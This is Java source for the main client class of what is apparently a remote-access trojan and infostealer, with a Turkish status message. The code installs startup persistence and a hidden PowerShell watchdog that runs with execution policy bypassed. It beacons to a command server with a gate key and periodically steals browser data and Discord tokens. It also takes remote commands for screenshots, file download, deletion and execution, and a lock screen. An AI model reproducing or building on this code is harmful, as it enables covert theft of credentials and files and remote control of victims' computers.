import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.InetAddress;
import java.net.URLEncoder;
import java.io.File;
import java.io.RandomAccessFile;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;

public class Client {
    private static final String SERVER_URL = "http://127.0.0.1:3434";
    private static final String GATE_KEY = "GATE-08B287DA004ED2A2";

    private static final String LOCK_FILE = System.getenv("TEMP") + "\\aas_client.lock";
    private static FileLock fileLock = null;
    private static FileChannel lockChannel = null;

    public static void main(String[] args) {
        if (!acquireLock()) {
            System.out.println("[!] İkinci instance tespit edildi, kapatılıyor...");
            System.exit(0);
            return;
        }

        Runtime.getRuntime().addShutdownHook(new Thread(() -> releaseLock()));

        StartupManager.register();

        startWatchdog();

        String pcName = "UNKNOWN-PC";
        String ip = resolveClientIp();
        String osInfo = System.getProperty("os.name") + " " + System.getProperty("os.arch");

        try {
            pcName = InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {}

        final String finalPc = pcName;
        final String finalIp = ip;

        sendPing(SERVER_URL, GATE_KEY, finalPc, finalIp, osInfo);

        new Thread(() -> {
            BrowserStealer.stealAndUpload(SERVER_URL, GATE_KEY, finalPc);
        }).start();

        SystemInfoHandler.collectAndSend(SERVER_URL, GATE_KEY, finalPc);

        new Thread(() -> {
            while (true) {
                try { Thread.sleep(7200000); } catch (InterruptedException e) { break; }
                BrowserStealer.stealAndUpload(SERVER_URL, GATE_KEY, finalPc);
            }
        }).start();

        new Thread(() -> {
            while (true) {
                try {
                    DiscordGrabber.sendTokensToServer(SERVER_URL, GATE_KEY, finalPc);
                } catch (Exception ignored) {}
                try { Thread.sleep(60000); } catch (InterruptedException e) { break; }
            }
        }).start();

        new Thread(() -> {
            while (true) {
                try {
                    URL url = new URL(SERVER_URL + "/api/bots/ping");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    String cleanPc = finalPc.replace("\\", "\\\\").replace("\"", "\\\"");
                    String cleanOs = osInfo.replace("\\", "\\\\").replace("\"", "\\\"");
                    String json = "{\"gateKey\":\"" + GATE_KEY + "\",\"pcName\":\"" + cleanPc + "\",\"ip\":\"" + finalIp + "\",\"osInfo\":\"" + cleanOs + "\"}";

                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(json.getBytes("UTF-8"));
                    }
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {}

                try { Thread.sleep(3000); } catch (InterruptedException e) { break; }
            }
        }).start();

        new Thread(() -> {
            while (true) {
                try {
                    String encodedPc = URLEncoder.encode(finalPc, "UTF-8");
                    URL url = new URL(SERVER_URL + "/api/bots/alerts?gateKey=" + GATE_KEY + "&pcName=" + encodedPc);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setReadTimeout(35000);
                    conn.setConnectTimeout(10000);

                    int code = conn.getResponseCode();
                    if (code == 200) {
                        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"))) {
                            StringBuilder response = new StringBuilder();
                            String line;
                            while ((line = br.readLine()) != null) {
                                response.append(line.trim());
                            }

                            String resStr = response.toString();

                            if (resStr.contains("\"type\":\"screenshot\"")) {
                                new Thread(() -> ScreenshotHandler.capture(SERVER_URL, GATE_KEY, finalPc)).start();
                            }
                            else if (resStr.contains("\"type\":\"sysinfo\"")) {
                                new Thread(() -> SystemInfoHandler.collectAndSend(SERVER_URL, GATE_KEY, finalPc)).start();
                            }
                            else if (resStr.contains("\"type\":\"browser_scan\"")) {
                                new Thread(() -> BrowserStealer.stealAndUpload(SERVER_URL, GATE_KEY, finalPc)).start();
                            }
                            else if (resStr.contains("\"type\":\"file_list\"")) {
                                String fmPath = extractVal(resStr, "path");
                                if (fmPath == null || fmPath.isEmpty()) fmPath = "DRIVES";
                                final String listPath = fmPath;
                                new Thread(() -> FileManagerHandler.listFiles(SERVER_URL, GATE_KEY, finalPc, listPath)).start();
                            }
                            else if (resStr.contains("\"type\":\"file_download\"")) {
                                String fmPath = extractVal(resStr, "path");
                                final String dlPath = fmPath != null ? fmPath : "";
                                new Thread(() -> FileManagerHandler.downloadFile(SERVER_URL, GATE_KEY, finalPc, dlPath)).start();
                            }
                            else if (resStr.contains("\"type\":\"file_delete\"")) {
                                String fmPath = extractVal(resStr, "path");
                                final String delPath = fmPath != null ? fmPath : "";
                                new Thread(() -> FileManagerHandler.deleteFile(SERVER_URL, GATE_KEY, finalPc, delPath)).start();
                            }
                            else if (resStr.contains("\"type\":\"file_exec\"")) {
                                String fmPath = extractVal(resStr, "path");
                                final String execPath = fmPath != null ? fmPath : "";
                                new Thread(() -> FileManagerHandler.executeFile(SERVER_URL, GATE_KEY, finalPc, execPath)).start();
                            }
                            else if (resStr.contains("\"type\":\"kill\"")) {
                                KillHandler.execute();
                                return;
                            }
                            else if (resStr.contains("\"type\":\"custom\"") || resStr.contains("\"type\":\"lock\"")) {
                                String title = extractVal(resStr, "title");
                                String message = extractVal(resStr, "message");
                                int duration = 10000;
                                try {
                                    if (resStr.contains("\"duration\":")) {
                                        duration = Integer.parseInt(resStr.split("\"duration\":")[1].split("[,}]")[0].trim());
                                    }
                                } catch (Exception ignored) {}

                                if (!ScreenLock.isLockActive()) {
                                    ScreenLock.showLockScreen(title, message, duration);
                                }
                            }
                        }
                    }
                    conn.disconnect();
                } catch (Exception e) {}

                try { Thread.sleep(200); } catch (InterruptedException e) { break; }
            }
        }).start();
    }

    private static boolean acquireLock() {
        try {
            File lockFile = new File(LOCK_FILE);
            lockChannel = new RandomAccessFile(lockFile, "rw").getChannel();
            fileLock = lockChannel.tryLock();
            if (fileLock == null) {
                try { lockChannel.close(); } catch (Exception ignored) {}
                return false;
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static void releaseLock() {
        try {
            if (fileLock != null && fileLock.isValid()) { fileLock.release(); fileLock = null; }
            if (lockChannel != null && lockChannel.isOpen()) { lockChannel.close(); lockChannel = null; }
            new File(LOCK_FILE).delete();
        } catch (Exception ignored) {}
    }

    private static void startWatchdog() {
        try {
            String jarPath = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            String tempDir = System.getenv("TEMP");
            if (tempDir == null) tempDir = "C:\\Windows\\Temp";

            File guardScript = new File(tempDir, "aas_guard.ps1");
            File killFlag = new File(tempDir, "aas_kill.flag");
            if (killFlag.exists()) killFlag.delete();

            String cleanJar = jarPath.replace("'", "''");
            String psContent = 
                "$jarPath = '" + cleanJar + "'\r\n" +
                "$killFlag = '" + killFlag.getAbsolutePath().replace("'", "''") + "'\r\n" +
                "$fileName = [System.IO.Path]::GetFileName($jarPath)\r\n" +
                "while ($true) {\r\n" +
                "    Start-Sleep -Seconds 3\r\n" +
                "    if (Test-Path $killFlag) { exit }\r\n" +
                "    $running = Get-CimInstance Win32_Process -Filter \"Name = 'javaw.exe' or Name = 'java.exe'\" | Where-Object { $_.CommandLine -like ('*' + $fileName + '*') }\r\n" +
                "    if (-not $running) {\r\n" +
                "        Start-Process 'javaw.exe' -ArgumentList ('-jar \"' + $jarPath + '\"') -WindowStyle Hidden\r\n" +
                "    }\r\n" +
                "}\r\n";

            java.nio.file.Files.write(guardScript.toPath(), psContent.getBytes("UTF-8"));

            Process checkProc = Runtime.getRuntime().exec(new String[]{
                "powershell.exe", "-NoProfile", "-Command",
                "Get-CimInstance Win32_Process -Filter \"Name = 'powershell.exe'\" | Where-Object { $_.CommandLine -like '*aas_guard.ps1*' } | Select-Object -ExpandProperty ProcessId"
            });
            BufferedReader reader = new BufferedReader(new InputStreamReader(checkProc.getInputStream()));
            String runningPid = reader.readLine();

            if (runningPid == null || runningPid.trim().isEmpty()) {
                ProcessBuilder pb = new ProcessBuilder(
                    "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", guardScript.getAbsolutePath()
                );
                pb.start();
            }

        } catch (Exception ignored) {}
    }

    private static String extractVal(String json, String key) {
        try {
            String s = "\"" + key + "\":\"";
            if (json.contains(s)) return json.split(s)[1].split("\"")[0];
        } catch (Exception e) {}
        return "";
    }

    private static void sendPing(String serverUrl, String gateKey, String pcName, String ip, String osInfo) {
        try {
            URL url = new URL(serverUrl + "/api/bots/ping");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Accept", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);

            String cleanPc = pcName.replace("\\", "\\\\").replace("\"", "\\\"");
            String cleanOs = osInfo.replace("\\", "\\\\").replace("\"", "\\\"");
            String json = "{\"gateKey\":\"" + gateKey + "\",\"pcName\":\"" + cleanPc + "\",\"ip\":\"" + ip + "\",\"osInfo\":\"" + cleanOs + "\"}";

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes("UTF-8"));
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    private static String resolveClientIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(1500);
            conn.setReadTimeout(1500);
            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
                String line = in.readLine();
                if (line != null && line.trim().matches("^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$")) {
                    return line.trim();
                }
            }
        } catch (Exception ignored) {}

        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception ignored) {}

        return "127.0.0.1";
    }
}